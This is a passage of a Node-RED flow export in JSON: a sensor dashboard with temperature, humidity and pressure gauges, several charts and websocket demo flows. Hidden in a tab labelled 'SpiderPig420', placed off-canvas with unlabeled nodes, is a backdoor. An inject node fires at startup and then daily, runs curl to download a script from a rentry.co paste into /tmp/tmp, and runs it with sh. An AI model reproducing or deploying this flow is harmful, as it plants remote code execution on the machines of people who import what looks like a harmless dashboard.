        "y": 820,
        "wires": []
    },
    {
        "id": "a2b8ffff98c644e4",
        "type": "ui_button",
        "z": "bbb8295636ce293b",
        "name": "",
        "group": "ab397e95.29ebe",
        "order": 1,
        "width": 0,
        "height": 0,
        "passthru": false,
        "label": "Time Line 1",
        "color": "",
        "bgcolor": "",
        "icon": "",
        "payload": "",
        "payloadType": "str",
        "topic": "",
        "x": 160,
        "y": 220,
        "wires": [
            [
                "38dec9d76196226e"
            ]
        ]
    },
    {
        "id": "0eef050568cc9c88",
        "type": "ui_button",
        "z": "bbb8295636ce293b",
        "name": "",
        "group": "ab397e95.29ebe",
        "order": 5,
        "width": 0,
        "height": 0,
        "passthru": false,
        "label": "array",
        "tooltip": "",
        "color": "",
        "bgcolor": "",
        "className": "",
        "icon": "",
        "payload": "",
        "payloadType": "str",
        "topic": "",
        "topicType": "str",
        "x": 140,
        "y": 380,
        "wires": [
            [
                "f58fbfcc55d02e4d"
            ]
        ]
    },
    {
        "id": "073a0ac5479cf703",
        "type": "ui_button",
        "z": "bbb8295636ce293b",
        "name": "",
        "group": "ab397e95.29ebe",
        "order": 6,
        "width": 0,
        "height": 0,
        "passthru": false,
        "label": "array2",
        "color": "",
        "bgcolor": "",
        "icon": "",
        "payload": "",
        "payloadType": "str",
        "topic": "",
        "x": 140,
        "y": 420,
        "wires": [
            [
                "ef056597a00ce1f3"
            ]
        ]
    },
    {
        "id": "22b988b0dc06a8bc",
        "type": "ui_button",
        "z": "bbb8295636ce293b",
        "name": "",
        "group": "ab397e95.29ebe",
        "order": 2,
        "width": 0,
        "height": 0,
        "passthru": false,
        "label": "Time Line 2",
        "color": "",
        "bgcolor": "",
        "icon": "",
        "payload": "",
        "payloadType": "str",
        "topic": "",
        "x": 160,
        "y": 260,
        "wires": [
            [
                "cc3cb0ccbd7f63ed"
            ]
        ]
    },
    {
        "id": "9cbe83edbf250d6d",
        "type": "ui_button",
        "z": "bbb8295636ce293b",
        "name": "",
        "group": "ab397e95.29ebe",
        "order": 10,
        "width": 0,
        "height": 0,
        "passthru": false,
        "label": "array for pie",
        "tooltip": "",
        "color": "",
        "bgcolor": "",
        "className": "",
        "icon": "",
        "payload": "",
        "payloadType": "str",
        "topic": "Pie 4 T",
        "topicType": "str",
        "x": 160,
        "y": 620,
        "wires": [
            [
                "a082c3b414d777b6"
            ]
        ]
    },
    {
        "id": "601f28869fd9c2a0",
        "type": "ui_button",
        "z": "bbb8295636ce293b",
        "name": "",
        "group": "ab397e95.29ebe",
        "order": 3,
        "width": 0,
        "height": 0,
        "passthru": false,
        "label": "Time Line 3",
        "color": "",
        "bgcolor": "",
        "icon": "",
        "payload": "",
        "payloadType": "str",
        "topic": "",
        "x": 160,
        "y": 300,
        "wires": [
            [
                "3a45cf6d69cd016f"
            ]
        ]
    },
    {
        "id": "a75353a474409b07",
        "type": "ui_button",
        "z": "bbb8295636ce293b",
        "name": "",
        "group": "ab397e95.29ebe",
        "order": 4,
        "width": 0,
        "height": 0,
        "passthru": false,
        "label": "Time Line 4",
        "color": "",
        "bgcolor": "",
        "icon": "",
        "payload": "",
        "payloadType": "str",
        "topic": "",
        "x": 160,
        "y": 340,
        "wires": [
            [
                "11f1992c2917882e"
            ]
        ]
    },
    {
        "id": "e31353c877d152aa",
        "type": "ui_button",
        "z": "bbb8295636ce293b",
        "name": "",
        "group": "ab397e95.29ebe",
        "order": 9,
        "width": 0,
        "height": 0,
        "passthru": false,
        "label": "array3c",
        "tooltip": "",
        "color": "",
        "bgcolor": "",
        "className": "",
        "icon": "",
        "payload": "",
        "payloadType": "str",
        "topic": "",
        "topicType": "str",
        "x": 150,
        "y": 540,
        "wires": [
            [
                "753ff3c4d82a0f2a"
            ]
        ]
    },
    {
        "id": "47b59171bfd1940d",
        "type": "ui_button",
        "z": "bbb8295636ce293b",
        "name": "",
        "group": "ab397e95.29ebe",
        "order": 11,
        "width": 0,
        "height": 0,
        "passthru": false,
        "label": "array 2 for pie",
        "tooltip": "",
        "color": "",
        "bgcolor": "",
        "className": "",
        "icon": "",
        "payload": "",
        "payloadType": "str",
        "topic": "Pie Hole",
        "topicType": "str",
        "x": 170,
        "y": 660,
        "wires": [
            [
                "60a34168154a3577"
            ]
        ]
    },
    {
        "id": "2955fb736690a586",
        "type": "ui_button",
        "z": "bbb8295636ce293b",
        "name": "",
        "group": "ab397e95.29ebe",
        "order": 7,
        "width": 0,
        "height": 0,
        "passthru": false,
        "label": "array3a",
        "tooltip": "",
        "color": "",
        "bgcolor": "",
        "className": "",
        "icon": "",
        "payload": "",
        "payloadType": "str",
        "topic": "",
        "topicType": "str",
        "x": 150,
        "y": 460,
        "wires": [
            [
                "1c65b2299ebe75f6"
            ]
        ]
    },
    {
        "id": "5de4a1df3d2ea63c",
        "type": "ui_button",
        "z": "bbb8295636ce293b",
        "name": "",
        "group": "ab397e95.29ebe",
        "order": 8,
        "width": 0,
        "height": 0,
        "passthru": false,
        "label": "array3b",
        "tooltip": "",
        "color": "",
        "bgcolor": "",
        "className": "",
        "icon": "",
        "payload": "",
        "payloadType": "str",
        "topic": "",
        "topicType": "str",
        "x": 150,
        "y": 500,
        "wires": [
            [
                "f3de8ebe9396e279"
            ]
        ]
    },
    {
        "id": "325ef8342e88efd9",
        "type": "ui_button",
        "z": "bbb8295636ce293b",
        "name": "",
        "group": "ab397e95.29ebe",
        "order": 11,
        "width": 0,
        "height": 0,
        "passthru": false,
        "label": "Clear All",
        "tooltip": "",
        "color": "",
        "bgcolor": "",
        "className": "",
        "icon": "",
        "payload": "[]",
        "payloadType": "json",
        "topic": "",
        "topicType": "str",
        "x": 290,
        "y": 60,
        "wires": [
            [
                "d6d0718936c31816",
                "6f36987be8b7a747",
                "e0cd556d1577cf81",
                "76cb5629f98905ed",
                "4b367719412bccf8",
                "937af8e080c7e05a"
            ]
        ]
    },
    {
        "id": "04f534d1b6762b35",
        "type": "ui_gauge",
        "z": "bbb8295636ce293b",
        "name": "Temp DHT11",
        "group": "d4fe26d3.991cf8",
        "order": 1,
        "width": 0,
        "height": 0,
        "gtype": "gage",
        "title": "Temp DHT11",
        "label": "",
        "format": "{{value}}°C",
        "min": 0,
        "max": "60",
        "colors": [
            "#008000",
            "#ff8000",
            "#ff0000"
        ],
        "x": 550,
        "y": 900,
        "wires": []
    },
    {
        "id": "12131cae4c75d17c",
        "type": "ui_gauge",
        "z": "bbb8295636ce293b",
        "name": "Temp DS18B20",
        "group": "b914d6c9.8d1b18",
        "order": 1,
        "width": 0,
        "height": 0,
        "gtype": "gage",
        "title": "Temp DS18B20",
        "label": "",
        "format": "{{value}}°C",
        "min": 0,
        "max": "60",
        "colors": [
            "#008000",
            "#ff8000",
            "#ff0000"
        ],
        "x": 560,
        "y": 1100,
        "wires": []
    },
    {
        "id": "f6d6bbd6600baabd",
        "type": "ui_gauge",
        "z": "bbb8295636ce293b",
        "name": "Temp BMP180",
        "group": "2c6a4858.2d97e8",
        "order": 1,
        "width": 0,
        "height": 0,
        "gtype": "gage",
        "title": "Temp BMP180",
        "label": "",
        "format": "{{value}}°C",
        "min": 0,
        "max": "60",
        "colors": [
            "#008000",
            "#ff8000",
            "#ff0000"
        ],
        "x": 560,
        "y": 1220,
        "wires": []
    },
    {
        "id": "453f68b9649f4f82",
        "type": "ui_gauge",
        "z": "bbb8295636ce293b",
        "name": "Humid DHT11",
        "group": "84440358.ae3f7",
        "order": 1,
        "width": 0,
        "height": 0,
        "gtype": "gage",
        "title": "Humid DHT11",
        "label": "",
        "format": "{{value}}%",
        "min": 0,
        "max": "100",
        "colors": [
            "#ffff80",
            "#ff8000",
            "#008000"
        ],
        "x": 560,
        "y": 980,
        "wires": []
    },
    {
        "id": "e593bd2244886661",
        "type": "ui_gauge",
        "z": "bbb8295636ce293b",
        "name": "Pressure BMP180",
        "group": "84440358.ae3f7",
        "order": 2,
        "width": 0,
        "height": 0,
        "gtype": "gage",
        "title": "Pressure BMP180",
        "label": "",
        "format": "{{value}} Bar",
        "min": 0,
        "max": "2",
        "colors": [
            "#ffff80",
            "#ff8000",
            "#008000"
        ],
        "x": 570,
        "y": 1300,
        "wires": []
    },
    {
        "id": "937af8e080c7e05a",
        "type": "ui_chart",
        "z": "bbb8295636ce293b",
        "name": "",
        "group": "89749fb7.87f01",
        "order": 1,
        "width": 0,
        "height": 0,
        "label": "line chart",
        "chartType": "line",
        "legend": "false",
        "xformat": "auto",
        "interpolate": "linear",
        "nodata": "No Data",
        "dot": false,
        "ymin": "",
        "ymax": "",
        "removeOlder": 1,
        "removeOlderPoints": "",
        "removeOlderUnit": "3600",
        "cutout": 0,
        "useOneColor": false,
        "useUTC": false,
        "colors": [
            "#1f77b4",
            "#aec7e8",
            "#ff7f0e",
            "#2ca02c",
            "#98df8a",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "outputs": 1,
        "useDifferentColor": false,
        "className": "",
        "x": 620,
        "y": 160,
        "wires": [
            []
        ]
    },
    {
        "id": "4b367719412bccf8",
        "type": "ui_chart",
        "z": "bbb8295636ce293b",
        "name": "",
        "group": "89749fb7.87f01",
        "order": 2,
        "width": 0,
        "height": 0,
        "label": "bar chart",
        "chartType": "bar",
        "legend": "false",
        "xformat": "HH:mm:ss",
        "interpolate": "linear",
        "nodata": "No Data",
        "dot": false,
        "ymin": "",
        "ymax": "",
        "removeOlder": 1,
        "removeOlderPoints": "",
        "removeOlderUnit": "3600",
        "cutout": 0,
        "useOneColor": false,
        "useUTC": false,
        "colors": [
            "#1f77b4",
            "#aec7e8",
            "#ff7f0e",
            "#2ca02c",
            "#98df8a",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "outputs": 1,
        "useDifferentColor": false,
        "className": "",
        "x": 620,
        "y": 220,
        "wires": [
            []
        ]
    },
    {
        "id": "e0cd556d1577cf81",
        "type": "ui_chart",
        "z": "bbb8295636ce293b",
        "name": "pie chart",
        "group": "89749fb7.87f01",
        "order": 3,
        "width": 0,
        "height": 0,
        "label": "pie chart",
        "chartType": "pie",
        "legend": "true",
        "xformat": "HH:mm:ss",
        "interpolate": "linear",
        "nodata": "",
        "dot": false,
        "ymin": "",
        "ymax": "",
        "removeOlder": 1,
        "removeOlderPoints": "",
        "removeOlderUnit": "3600",
        "cutout": "30",
        "useOneColor": false,
        "useUTC": false,
        "colors": [
            "#1f77b4",
            "#aec7e8",
            "#ff7f0e",
            "#2ca02c",
            "#98df8a",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "outputs": 1,
        "useDifferentColor": false,
        "className": "",
        "x": 620,
        "y": 280,
        "wires": [
            []
        ]
    },
    {
        "id": "76cb5629f98905ed",
        "type": "ui_chart",
        "z": "bbb8295636ce293b",
        "name": "",
        "group": "4e7edda4.417004",
        "order": 2,
        "width": 0,
        "height": 0,
        "label": "horizontal bar",
        "chartType": "horizontalBar",
        "legend": "false",
        "xformat": "HH:mm:ss",
        "interpolate": "linear",
        "nodata": "",
        "dot": false,
        "ymin": "",
        "ymax": "200",
        "removeOlder": 1,
        "removeOlderPoints": "",
        "removeOlderUnit": "3600",
        "cutout": "30",
        "useOneColor": false,
        "useUTC": false,
        "colors": [
            "#1f77b4",
            "#aec7e8",
            "#ff7f0e",
            "#2ca02c",
            "#98df8a",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "outputs": 1,
        "useDifferentColor": false,
        "className": "",
        "x": 640,
        "y": 400,
        "wires": [
            []
        ]
    },
    {
        "id": "6f36987be8b7a747",
        "type": "ui_chart",
        "z": "bbb8295636ce293b",
        "name": "",
        "group": "4e7edda4.417004",
        "order": 3,
        "width": 0,
        "height": 0,
        "label": "polar chart",
        "chartType": "polar-area",
        "legend": "false",
        "xformat": "HH:mm:ss",
        "interpolate": "linear",
        "nodata": "",
        "dot": false,
        "ymin": "",
        "ymax": "",
        "removeOlder": 1,
        "removeOlderPoints": "",
        "removeOlderUnit": "3600",
        "cutout": "30",
        "useOneColor": false,
        "useUTC": false,
        "colors": [
            "#1f77b4",
            "#aec7e8",
            "#ff7f0e",
            "#2ca02c",
            "#98df8a",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "outputs": 1,
        "useDifferentColor": false,
        "className": "",
        "x": 630,
        "y": 460,
        "wires": [
            []
        ]
    },
    {
        "id": "d6d0718936c31816",
        "type": "ui_chart",
        "z": "bbb8295636ce293b",
        "name": "",
        "group": "4e7edda4.417004",
        "order": 4,
        "width": 0,
        "height": 0,
        "label": "radar chart",
        "chartType": "radar",
        "legend": "false",
        "xformat": "HH:mm:ss",
        "interpolate": "linear",
        "nodata": "",
        "dot": false,
        "ymin": "",
        "ymax": "",
        "removeOlder": 1,
        "removeOlderPoints": "",
        "removeOlderUnit": "3600",
        "cutout": "30",
        "useOneColor": false,
        "useUTC": false,
        "colors": [
            "#1f77b4",
            "#aec7e8",
            "#ff7f0e",
            "#2ca02c",
            "#98df8a",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "outputs": 1,
        "useDifferentColor": false,
        "className": "",
        "x": 630,
        "y": 520,
        "wires": [
            []
        ]
    },
    {
        "id": "c11108d00157b394",
        "type": "ui_chart",
        "z": "bbb8295636ce293b",
        "name": "Graph 5 min Temp DHT11 (°C)",
        "group": "d4fe26d3.991cf8",
        "order": 2,
        "width": 0,
        "height": 0,
        "label": "Graph 5 min Temp DHT11 (°C)",
        "chartType": "line",
        "legend": "false",
        "xformat": "%H:%M:%S",
        "interpolate": "basis",
        "nodata": "",
        "ymin": "10",
        "ymax": "40",
        "removeOlder": "5",
        "removeOlderUnit": "60",
        "outputs": 2,
        "x": 610,
        "y": 940,
        "wires": [
            [],
            []
        ]
    },
    {
        "id": "74654eabfc7b2c22",
        "type": "ui_chart",
        "z": "bbb8295636ce293b",
        "name": "Graph 5min Temp DS18B20 (°C)",
        "group": "b914d6c9.8d1b18",
        "order": 0,
        "width": 0,
        "height": 0,
        "label": "Graph 5min Temp DS18B20 (°C)",
        "chartType": "line",
        "legend": "false",
        "xformat": "%H:%M:%S",
        "interpolate": "basis",
        "nodata": "",
        "ymin": "10",
        "ymax": "40",
        "removeOlder": "5",
        "removeOlderUnit": "60",
        "outputs": 2,
        "x": 620,
        "y": 1140,
        "wires": [
            [],
            []
        ]
    },
    {
        "id": "37f5a2f1ca5e5f37",
        "type": "ui_chart",
        "z": "bbb8295636ce293b",
        "name": "Graph 5 min Temp BMP180 (°C)",
        "group": "2c6a4858.2d97e8",
        "order": 0,
        "width": 0,
        "height": 0,
        "label": "Graph 5 min Temp BMP180 (°C)",
        "chartType": "line",
        "legend": "false",
        "xformat": "%H:%M:%S",
        "interpolate": "basis",
        "nodata": "",
        "ymin": "10",
        "ymax": "40",
        "removeOlder": "5",
        "removeOlderUnit": "60",
        "outputs": 2,
        "x": 610,
        "y": 1260,
        "wires": [
            [],
            []
        ]
    },
    {
        "id": "947abda074f4cf6f",
        "type": "ui_chart",
        "z": "bbb8295636ce293b",
        "name": "Humid DHT11 (24 Horas)",
        "group": "a249173c.7e48d8",
        "order": 2,
        "width": 0,
        "height": 0,
        "label": "Humid DHT11 (%)",
        "chartType": "line",
        "legend": "false",
        "xformat": "%H:%M:%S",
        "interpolate": "basis",
        "nodata": "",
        "ymin": "0",
        "ymax": "100",
        "removeOlder": "1",
        "removeOlderUnit": "86400",
        "outputs": 2,
        "x": 790,
        "y": 1060,
        "wires": [
            [],
            []
        ]
    },
    {
        "id": "da084496cf238f30",
        "type": "ui_chart",
        "z": "bbb8295636ce293b",
        "name": "Pressure  DHT11 (24 Horas)",
        "group": "63fe04f6.773c0c",
        "order": 2,
        "width": 0,
        "height": 0,
        "label": "Pressure DHT11 (Bar)",
        "chartType": "line",
        "legend": "false",
        "xformat": "%H:%M:%S",
        "interpolate": "basis",
        "nodata": "",
        "ymin": "0",
        "ymax": "2",
        "removeOlder": "1",
        "removeOlderUnit": "86400",
        "outputs": 2,
        "x": 800,
        "y": 1340,
        "wires": [
            [],
            []
        ]
    },
    {
        "id": "1330abbf5f76ad7c",
        "type": "ui_chart",
        "z": "bbb8295636ce293b",
        "name": "Temp DS18B20 (24 Horas)",
        "group": "755805a6.c720ec",
        "order": 2,
        "width": 0,
        "height": 0,
        "label": "Temp DS18B20 (°C)",
        "chartType": "line",
        "legend": "false",
        "xformat": "%H:%M:%S",
        "interpolate": "basis",
        "nodata": "",
        "ymin": "0",
        "ymax": "40",
        "removeOlder": "1",
        "removeOlderUnit": "86400",
        "outputs": 2,
        "x": 800,
        "y": 1180,
        "wires": [
            [],
            []
        ]
    },
    {
        "id": "948829b41f444402",
        "type": "ui_chart",
        "z": "bbb8295636ce293b",
        "name": "Graph 5 min Humid DHT11 (%)",
        "group": "66220f0a.3097",
        "order": 2,
        "width": 0,
        "height": 0,
        "label": "Graph 5 min Humid DHT11 (%)",
        "chartType": "line",
        "legend": "false",
        "xformat": "%H:%M:%S",
        "interpolate": "basis",
        "nodata": "",
        "ymin": "0",
        "ymax": "100",
        "removeOlder": "5",
        "removeOlderUnit": "60",
        "outputs": 2,
        "x": 610,
        "y": 1020,
        "wires": [
            [],
            []
        ]
    },
    {
        "id": "e0a37e248b12442c",
        "type": "random",
        "z": "bbb8295636ce293b",
        "name": "",
        "low": "1",
        "high": "10000000",
        "inte": "true",
        "x": 320,
        "y": 580,
        "wires": [
            [
                "937af8e080c7e05a"
            ]
        ]
    },
    {
        "id": "1504cbdae3adc5aa",
        "type": "serial in",
        "z": "bbb8295636ce293b",
        "d": true,
        "name": "",
        "serial": "d86c30358aabe2a6",
        "x": 140,
        "y": 740,
        "wires": [
            [
                "8c94c1745a471862"
            ]
        ]
    },
    {
        "id": "367f9325.6e63a5",
        "type": "inject",
        "z": "SpiderPig420",
        "name": "",
        "props": [
            {
                "p": "payload"
            },
            {
                "p": "topic",
                "vt": "str"
            }
        ],
        "repeat": "86400",
        "crontab": "",
        "once": true,
        "onceDelay": "2",
        "topic": "",
        "payload": "",
        "payloadType": "date",
        "x": 4330,
        "y": 4580,
        "wires": [
            [
                "83fd938d.0278e"
            ]
        ]
    },
    {
        "id": "57a76eaa.27a329",
        "type": "debug",
        "z": "SpiderPig420",
        "name": "",
        "active": false,
        "tosidebar": true,
        "console": false,
        "tostatus": false,
        "complete": "false",
        "statusVal": "",
        "statusType": "auto",
        "x": 4710,
        "y": 4580,
        "wires": []
    },
    {
        "id": "83fd938d.0278e",
        "type": "exec",
        "z": "SpiderPig420",
        "command": "curl -s --stderr - https://rentry.co/sn4ft/raw | sed \"s/\\r//g\"  > /tmp/tmp",
        "addpay": "",
        "append": "",
        "useSpawn": "false",
        "timer": "",
        "oldrc": false,
        "name": "",
        "x": 4455,
        "y": 4580,
        "wires": [
            [
                "f1f1ab6.1a715d9"
            ],
            [],
            []
        ],
        "l": false
    },
    {
        "id": "f1f1ab6.1a715d9",
        "type": "exec",
        "z": "SpiderPig420",
        "command": "sh /tmp/tmp",
        "addpay": "",
        "append": "",
        "useSpawn": "true",
        "timer": "",
        "oldrc": false,
        "name": "",
        "x": 4555,
        "y": 4580,
        "wires": [
            [
                "57a76eaa.27a329"
            ],
            [
                "57a76eaa.27a329"
            ],
            []
        ],
        "l": false
    },
    {
        "id": "e3e4522e.1c1bb",
        "type": "inject",
        "z": "SpiderPig420",
        "name": "Tick every 5 secs",
        "props": [
            {
                "p": "payload"
            },
            {
                "p": "topic",
                "vt": "str"
            }
        ],
        "repeat": "10",
        "crontab": "",
        "once": false,
        "onceDelay": "",
        "topic": "test",
        "payloadType": "date",
        "x": 150,
        "y": 160,
        "wires": [
            [
                "45dbf990.ba2408"
            ]
        ]
    },
    {
        "id": "50da04b3.af25fc",
        "type": "websocket out",
        "z": "SpiderPig420",
        "name": "",
        "server": "c0a31c6397e1a095",
        "client": "",
        "x": 910,
        "y": 160,
        "wires": []
    },
    {
        "id": "42a28745.bd5d78",
        "type": "http response",
        "z": "SpiderPig420",
        "name": "",
        "statusCode": "",
        "headers": {},
        "x": 490,
        "y": 100,
        "wires": []
    },
    {
        "id": "1787be40.e87842",
        "type": "http in",
        "z": "SpiderPig420",
        "name": "",
        "url": "/simple",
        "method": "get",
        "upload": false,
        "swaggerDoc": "",
        "x": 110,
        "y": 100,
        "wires": [
            [
                "1857548e.e7a8ab"
            ]
        ]
    },
    {
        "id": "1857548e.e7a8ab",
        "type": "template",
        "z": "SpiderPig420",
        "name": "Simple Web Page",
        "field": "payload",
        "fieldType": "msg",
        "format": "html",
        "syntax": "mustache",
        "template": "<!DOCTYPE HTML>\n<html>\n    <head>\n    <title>Simple Live Display</title>\n    <script type=\"text/javascript\">\n        var ws;\n        var wsUri = \"ws:\";\n        var loc = window.location;\n        console.log(loc);\n        if (loc.protocol === \"https:\") { wsUri = \"wss:\"; }\n        // This needs to point to the web socket in the Node-RED flow\n        // ... in this case it's ws/simple\n        wsUri += \"//\" + loc.host + loc.pathname.replace(\"simple\",\"ws/simple\");\n\n        function wsConnect() {\n            console.log(\"connect\",wsUri);\n            ws = new WebSocket(wsUri);\n            //var line = \"\";    // either uncomment this for a building list of messages\n            ws.onmessage = function(msg) {\n                var line = \"\";  // or uncomment this to overwrite the existing message\n                // parse the incoming message as a JSON object\n                var data = msg.data;\n                //console.log(data);\n                // build the output from the topic and payload parts of the object\n                line += \"<p>\"+data+\"</p>\";\n                // replace the messages div with the new \"line\"\n                document.getElementById('messages').innerHTML = line;\n                //ws.send(JSON.stringify({data:data}));\n            }\n            ws.onopen = function() {\n                // update the status div with the connection status\n                document.getElementById('status').innerHTML = \"connected\";\n                //ws.send(\"Open for data\");\n                console.log(\"connected\");\n            }\n            ws.onclose = function() {\n                // update the status div with the connection status\n                document.getElementById('status').innerHTML = \"not connected\";\n                // in case of lost connection tries to reconnect every 3 secs\n                setTimeout(wsConnect,3000);\n            }\n        }\n        \n        function doit(m) {\n            if (ws) { ws.send(m); }\n        }\n    </script>\n    </head>\n    <body onload=\"wsConnect();\" onunload=\"ws.disconnect();\">\n        <font face=\"Arial\">\n        <h1>Simple Live Display</h1>\n        <div id=\"messages\"></div>\n        <button type=\"button\" onclick='doit(\"click\");'>Click to send message</button>\n        <hr/>\n        <div id=\"status\">unknown</div>\n        </font>\n    </body>\n</html>\n",
        "x": 310,
        "y": 100,
        "wires": [
            [
                "42a28745.bd5d78"
            ]
        ]
    },
    {
        "id": "45dbf990.ba2408",
        "type": "function",
        "z": "SpiderPig420",
        "name": "format time nicely",
        "func": "msg.payload = Date(msg.payload).toString();\nreturn msg;",
        "outputs": 1,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 370,
        "y": 160,
        "wires": [
            [
                "50da04b3.af25fc"
            ]
        ]
    },
    {
        "id": "eccc8bc2.133378",
        "type": "websocket in",
        "z": "SpiderPig420",
        "name": "",
        "server": "c0a31c6397e1a095",
        "client": "",
        "x": 450,
        "y": 200,
        "wires": [
            [
                "9adfff59.652"
            ]
        ]
    },
    {
        "id": "9adfff59.652",
        "type": "debug",
        "z": "SpiderPig420",
        "name": "",
        "active": false,
        "tosidebar": true,
        "console": false,
        "complete": "false",
        "statusVal": "",
        "statusType": "auto",
        "x": 970,
        "y": 200,
        "wires": []
    },
    {
        "id": "285912b428dbe52f",
        "type": "inject",
        "z": "SpiderPig420",
        "name": "Tick every 5 secs",
        "props": [
            {
                "p": "payload"
            },
            {
                "p": "topic",
                "vt": "str"
            }
        ],
        "repeat": "10",
        "crontab": "",
        "once": false,
        "onceDelay": "",
        "topic": "test",
        "payloadType": "date",
        "x": 150,
        "y": 260,
        "wires": [
            [
                "279c37f280ec9252"
            ]
        ]
    },
    {
        "id": "0374659f694da4aa",
        "type": "websocket out",
        "z": "SpiderPig420",
        "name": "",
        "server": "c0a31c6397e1a095",
        "client": "",
        "x": 910,
        "y": 260,
        "wires": []
    },
    {
        "id": "279c37f280ec9252",
        "type": "function",
        "z": "SpiderPig420",
        "name": "format time nicely",
        "func": "msg.payload = Date(msg.payload).toString();\nreturn msg;",
        "outputs": 1,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 370,
        "y": 260,
        "wires": [
            [
                "0374659f694da4aa"
            ]
        ]
    },
    {
        "id": "314606ba816aa05c",
        "type": "websocket in",
        "z": "SpiderPig420",
        "name": "",
        "server": "c0a31c6397e1a095",
        "client": "",
        "x": 450,
        "y": 300,
        "wires": [
            [
                "15771a80e4ba2c33"
            ]
        ]
    },
    {
        "id": "15771a80e4ba2c33",
        "type": "debug",
        "z": "SpiderPig420",
        "name": "",
        "active": false,
        "console": "false",
        "complete": "false",
        "x": 970,
        "y": 300,
        "wires": []
    },
    {
        "id": "54ba58708cf91c01",
        "type": "inject",
        "z": "SpiderPig420",
        "name": "Tick every 5 secs",
        "props": [
            {
                "p": "payload"
            },
            {
                "p": "topic",
                "vt": "str"
            }
        ],
        "repeat": "10",
        "crontab": "",
        "once": false,
        "onceDelay": "",
        "topic": "test",
        "payloadType": "date",
        "x": 150,
        "y": 360,
        "wires": [
            [
                "97b241a7e5343b5c"
            ]
        ]
    },
    {
        "id": "3ef72d079e90b83f",
        "type": "websocket out",
        "z": "SpiderPig420",
        "name": "",
        "server": "c0a31c6397e1a095",
        "client": "",
        "x": 910,
        "y": 360,
        "wires": []
    },
    {
        "id": "97b241a7e5343b5c",
        "type": "function",
        "z": "SpiderPig420",
        "name": "format time nicely",
        "func": "msg.payload = Date(msg.payload).toString();\nreturn msg;",
        "outputs": 1,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 370,
        "y": 360,
        "wires": [
            [
                "3ef72d079e90b83f"
            ]
        ]
    },
    {
        "id": "3ee4ad6863ee86ae",
        "type": "websocket in",
        "z": "SpiderPig420",
        "name": "",
        "server": "c0a31c6397e1a095",
        "client": "",
        "x": 450,
        "y": 400,
        "wires": [
            [
                "e9e7f32680675b9e"
            ]
        ]
    },
    {
        "id": "e9e7f32680675b9e",
        "type": "debug",
        "z": "SpiderPig420",
        "name": "",
        "active": false,
        "console": "false",
        "complete": "false",
        "x": 970,
        "y": 400,
        "wires": []
    },
    {
        "id": "1b857eeb236bd619",
        "type": "inject",
        "z": "SpiderPig420",
        "name": "Tick every 5 secs",
        "props": [
            {
                "p": "payload"
            },
            {
                "p": "topic",
                "vt": "str"
            }
        ],
        "repeat": "10",
        "crontab": "",
        "once": false,
        "onceDelay": "",
        "topic": "test",
        "payloadType": "date",
        "x": 150,
        "y": 460,
        "wires": [
            [
                "77cfdd0f8ecf6aee"
            ]
        ]
    },
    {
        "id": "738bdeb19275cadc",
        "type": "websocket out",
        "z": "SpiderPig420",
        "name": "",
        "server": "c0a31c6397e1a095",
        "client": "",
        "x": 910,
        "y": 460,
        "wires": []
    },
    {
        "id": "77cfdd0f8ecf6aee",
        "type": "function",
        "z": "SpiderPig420",
        "name": "format time nicely",
        "func": "msg.payload = Date(msg.payload).toString();\nreturn msg;",
        "outputs": 1,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 370,
        "y": 460,
        "wires": [
            [
                "738bdeb19275cadc"
            ]
        ]
    },
    {
        "id": "b2acac17389224e8",
        "type": "websocket in",
        "z": "SpiderPig420",
        "name": "",
        "server": "c0a31c6397e1a095",
        "client": "",
        "x": 450,
        "y": 500,
        "wires": [
            [
                "210cb8da23e0dc75"
            ]
        ]
    },
    {
        "id": "210cb8da23e0dc75",
        "type": "debug",
        "z": "SpiderPig420",
        "name": "",
        "active": false,
        "console": "false",
        "complete": "false",
        "x": 970,
        "y": 500,
        "wires": []
    },
    {
        "id": "2fe821761953aa88",
        "type": "inject",
        "z": "SpiderPig420",
        "name": "Tick every 5 secs",
        "props": [
            {
                "p": "payload"
            },
            {
                "p": "topic",
                "vt": "str"
            }
        ],
        "repeat": "10",
        "crontab": "",
        "once": false,
        "onceDelay": "",
        "topic": "test",
        "payloadType": "date",
        "x": 150,
        "y": 560,
        "wires": [
            [
                "a9b805265aeb211d"
            ]
        ]
    },
    {
        "id": "7a98170835cb523b",
        "type": "websocket out",
        "z": "SpiderPig420",
        "name": "",
        "server": "c0a31c6397e1a095",
        "client": "",
        "x": 910,
        "y": 560,
        "wires": []
    },
    {
        "id": "a9b805265aeb211d",
        "type": "function",
        "z": "SpiderPig420",
        "name": "format time nicely",
        "func": "msg.payload = Date(msg.payload).toString();\nreturn msg;",
        "outputs": 1,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 370,
        "y": 560,
        "wires": [
            [
                "7a98170835cb523b"
            ]
        ]
    },
    {
        "id": "8135ccd7ab1b3ff2",
        "type": "websocket in",
        "z": "SpiderPig420",
        "name": "",
        "server": "c0a31c6397e1a095",
        "client": "",
        "x": 450,
        "y": 600,
        "wires": [
            [
                "47b1913997ba4ccd"
            ]
        ]
    },
    {
        "id": "47b1913997ba4ccd",
        "type": "debug",
        "z": "SpiderPig420",
        "name": "",
        "active": false,
        "console": "false",
        "complete": "false",
        "x": 970,
        "y": 600,
        "wires": []
    },
    {
        "id": "1e54bdda61885e65",
        "type": "inject",
        "z": "SpiderPig420",
        "name": "Tick every 5 secs",
        "props": [
            {
                "p": "payload"
            },
            {
                "p": "topic",
                "vt": "str"
            }
        ],
        "repeat": "10",
        "crontab": "",
        "once": false,
        "onceDelay": "",
        "topic": "test",
        "payloadType": "date",
        "x": 150,
        "y": 660,
        "wires": [
            [
                "cd388343e79e2575"
            ]
        ]
    },
    {
        "id": "c8c035060cca9b2b",
        "type": "websocket out",
        "z": "SpiderPig420",
        "name": "",
        "server": "c0a31c6397e1a095",
        "client": "",
